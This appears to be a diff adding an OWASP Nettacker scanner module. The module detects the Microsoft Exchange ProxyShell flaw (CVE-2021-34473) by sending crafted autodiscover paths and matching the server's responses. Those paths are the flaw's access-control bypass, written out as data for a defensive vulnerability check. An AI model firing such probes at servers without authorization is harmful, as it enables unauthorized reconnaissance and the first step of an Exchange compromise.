@@ -1,0 +1,52 @@
+info:
+  name: msexchange_cve_2021_34473_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description: Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.
+  reference:
+    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
+    - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - msexchange
+    - cve
+    - cve2021
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        allow_redirects: false
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - 'autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com'
+                - 'autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com'
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            content:
+              regex: Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException|Exchange MAPI\/HTTP Connectivity Endpoint
+              reverse: false
